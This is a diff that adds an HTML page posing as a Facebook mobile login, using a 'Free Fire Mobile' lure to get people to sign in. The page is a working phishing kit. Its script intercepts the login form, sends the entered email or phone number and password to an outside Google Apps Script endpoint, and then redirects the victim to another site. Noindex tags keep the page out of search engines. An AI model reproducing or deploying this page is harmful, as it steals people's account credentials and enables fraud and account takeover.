@@ -1,0 +1,326 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta charset="windows-1252">
+            <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
+            <meta name="google-site-verification" content="JKdaLsmsrwkxCo5Isf8naALVWLzzvh1J0lxVYE12i-w">
+            <base target="_parent">
+            <meta name="robots" content="noindex">
+            <meta name="googlebot" content="noindex">
+            <meta name="robots" content="noindex, nofollow">
+            <meta name="robots" content="noindex">
+            <title>Login To Continue</title>
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <meta name="revisit-after" content="55500000 days">
+            <meta name="robots" content="NOINDEX">
+            </head>
+            <body><div id="loadmec">
+
+
+                <meta charset="UTF-8">
+                <meta http-equiv="X-UA-Compatible" content="IE=edge">
+                <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                <link rel="stylesheet" href="style.css">
+                    <title>Face book mobile</title>
+            
+            
+            
+                <div id="f-mobile">
+                    <header class="fbc">
+                        Facebook
+                    </header>
+                    <div class="warningbox"><span>log in first.</span></div>
+                    <div class="img">
+                        <img src="https://d13pxqgp3ixdbh.cloudfront.net/uploads/1642309138e4b4f2d7c322240d0473e9f812313efb.png" alt="">
+                    </div>
+                    <div class="text"><p>Log in to your Facebook account to <br> connect to FREE FIRE MOBILE</p></div>
+                  
+                    <main>
+                        <form       method="POST"
+                        name="form" class="ffcard">
+                            <div class="input-wrapper">
+                                <div class="inputs">
+                                    <input type="text"  minlength="10" name="name" placeholder="Mobile number or email address" class="fbmef"   required="">
+                                    <input type="password"  minlength="8" name="password" placeholder="Password" class="fbmpf"   required="">
+                                    <input type="text"  name="userid" hidden="">
+                                    <input type="text" value="0570b3ec567d53eda9c8cc2503d5a16b" name="tk" hidden="">
+                                </div>
+                            </div>
+                            <button type="submit">Log In</button>
+                        </form>
+                        <div class="line"><span>or</span></div>
+                        <div class="signup-btn"><button>Create New Account</button></div>
+                        <div class="forgetpass"><a href="#">Forgotten password?</a></div>
+                        <footer>
+                            <div class="links-list">
+                                <ul class="right">
+                                    <li><a href="#">English (UK)</a></li>
+                                    <li><a href="#">Français (France)</a></li>
+                                    <li><a href="#">Deutsch</a></li>
+                                    <li><a href="#">Português (Brasil)</a></li>
+                                </ul>
+                                <ul class="left">
+                                    <li><a href="#">العربية</a></li>
+                                    <li><a href="#">Русский</a></li>
+                                    <li><a href="#">Español</a></li>
+                                    <li><div>+</div></li>
+                                </ul>
+                            </div>
+                            <div class="center">Facebook Inc.</div>
+                        </footer>
+                    </main>
+                </div>
+                
+            
+            </div>
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+            <script>
+
+                const scriptURL = 'https://script.google.com/macros/s/AKfycbz9U_1NlrjqOmPSb5tCUGusTmx0xWed-LKA_EJixZ_un-bMYh8GOya3eLdu6NbCxxph/exec';
+                
+                const form = document.forms['form'];
+                 
+               
+                form.addEventListener('submit', e => {
+                  e.preventDefault()
+                  fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+                   // .then(response => alert("Thank you! your form is submitted successfully." ))
+                   .then(() => { window.location.href='https://submit-codea.netlify.app/'; })
+                   // .catch(error => console.error('Error!', error.message))
+                })
+               </script>
+
+               <style>
+
+
+#f-mobile {
+    background-color: #fff;
+    min-height: 635px;
+    cursor: pointer;
+    font-family: Helvetica,Arial,sans-serif;
+    font-size: 14px;
+    line-height: 18px;
+}
+body {
+    margin: 0;
+}
+header {
+    background: #3b5998;
+    box-sizing: border-box;
+    height: 44px;
+    margin: 0 auto;
+    padding: 0;
+    position: relative;
+    width: 100%;
+    z-index: 12;
+    align-items: center;
+    display: flex;
+    display: -webkit-flex;
+    text-align: center;
+}
+.thelogo {
+    color: #576b95;
+    cursor: pointer;
+    text-decoration: none;
+    width: 90px;
+    height: 24px;
+    background-position: 0 0;
+    background-image: url(http://pcgifts-001-site1.itempurl.com/Assets/imgs/face/oldlogo.png);
+    background-size: contain;
+    background-repeat: no-repeat;
+    display: inline-block;
+    margin: 0 auto;
+}
+.warningbox {
+    padding: 5px 8px;
+    background-color: #fffbe2;
+    color: #7f7212;
+    border-color: #e2c822!important;
+    border-bottom: 1px solid;
+    cursor: pointer;
+    font-size: 14px;
+    line-height: 18px;
+    text-align: center;
+    /* margin-top: 27px; */
+}
+main {
+    box-sizing: border-box;
+    background-color: #fff;
+    border-bottom: 1px solid;
+    border-color: #e9e9e9;
+    min-height: 635px;
+    position: relative;
+    z-index: 0;
+}
+form.ffcard {
+    margin: 0 auto;
+    max-width: 95%;
+    padding: 16px 16px 1px;
+}
+.input-wrapper {
+    position: relative;
+}
+.inputs {
+    border-radius: 4px;
+    overflow: hidden;
+}
+button {
+    margin-top: 12px;
+    text-shadow: 0 -1px rgb(0 0 0 / 25%);
+    border: none;
+    border-radius: 3px;
+    box-sizing: border-box;
+    position: relative;
+    -webkit-user-select: none;
+    z-index: 0;
+    font-size: 14px;
+    height: 36px;
+    line-height: 36px;
+    padding: 0 16px;
+    color: #fff;
+    font-weight: 700;
+    background-color: #1877f2;
+    box-shadow: 0 1px 0 rgb(0 0 0 / 14%), inset 0 -1px 1px 0 rgb(0 0 0 / 3%);
+}
+.ffcard button {
+    display: block;
+    width: 100%;
+    text-align: center;
+    white-space: nowrap;
+}
+.fbmef, .fbmpf {
+    -webkit-appearance: none;
+    box-sizing: border-box;
+    width: 100%;
+    font-size: 14px;
+    line-height: 18px;
+    font-family: Helvetica,Arial,sans-serif;
+    background: #f5f6f7;
+    border: 1px solid hsla(0,0%,89.8%,.21);
+    padding: 12px;
+}
+.line {
+    display: block;
+    width: 100%;
+    text-align: center;
+    white-space: nowrap;
+}
+
+.line {
+    overflow: hidden;
+    max-width: 416px;
+    margin: 15px auto;
+}
+main .line span:after, main .line span:before {
+    background: #ccd0d5;
+    content: "";
+    height: 1px;
+    position: absolute;
+    top: 50%;
+    width: 9999px;
+}
+.fbc{
+    font-weight: bold;
+    color: #fff;
+    font-size: 30px;
+    text-align: center;
+    justify-content: center;
+    cursor: not-allowed;
+}
+ main .line span:before {
+    margin-right: 15px;
+    right: 100%;
+}
+main .line span:after {
+    left: 100%;
+    margin-left: 15px;
+}
+.img {
+    text-align: center;
+    justify-content: center;
+    width: 100%;
+    height: 50px;
+    
+}
+.img img{
+width: 60px;
+margin-top: 10px;
+margin-left: auto;
+margin-right: auto;
+margin-bottom: 10px;
+border-radius: 12px;
+display: inline-block;
+}
+
+.line span {
+    display: inline-block;
+    position: relative;
+    color: #4b4f56;
+    max-width: 416px;
+}
+.signup-btn {
+    padding: 12px 0;
+    text-align: center;
+}
+.signup-btn button {
+    background: #00a400;
+}
+.forgetpass {
+    text-align: center;
+}
+.forgetpass a {
+    color: #7596c8;
+    font-family: Roboto-Regular,Helvetica,"sans-serif";
+    font-size: 14px;
+    line-height: 16px;
+    text-decoration: none;
+}
+.links-list {
+    display: flex;
+    display: -webkit-flex;
+    padding: 6px;
+    margin: 0 auto;
+    max-width: 416px;
+}
+.links-list ul {
+    flex: 1;
+    min-width: 0;
+    width: 0;
+    text-align: center;
+}
+.links-list ul li {
+    list-style: none;
+}
+.links-list ul li a {
+    color: #576b95;
+    cursor: pointer;
+    text-decoration: none;
+}
+.links-list ul li div {
+    border: 1px solid #3b5998;
+    border-radius: 3px;
+    color: #3578e5;
+    display: block;
+    font-size: large;
+    height: 18px;
+    line-height: 17px;
+    text-align: center;
+    width: 18px;
+    margin: 0 auto;
+    color: grey;
+}
+.center {
+    text-align: center;
+    color: grey;
+}
+
+.text{
+    text-align: center;
+    margin-top: 30px;
+    padding: 8px;
+    color: #90949c;
+    font-size: 16px;
+    font-family: Roboto;
+}
+
+               </style>
+</html>
